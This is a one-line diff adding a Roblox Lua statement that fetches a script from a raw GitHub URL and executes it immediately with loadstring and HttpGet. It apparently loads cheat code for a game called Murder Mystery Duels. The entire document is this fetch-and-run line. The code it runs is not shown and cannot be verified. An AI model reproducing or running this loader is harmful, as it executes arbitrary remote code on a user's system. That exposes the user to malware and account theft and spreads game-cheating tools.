@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/murder-mystery-duels-spam6-bejip3iio7x1ke.lua"))()
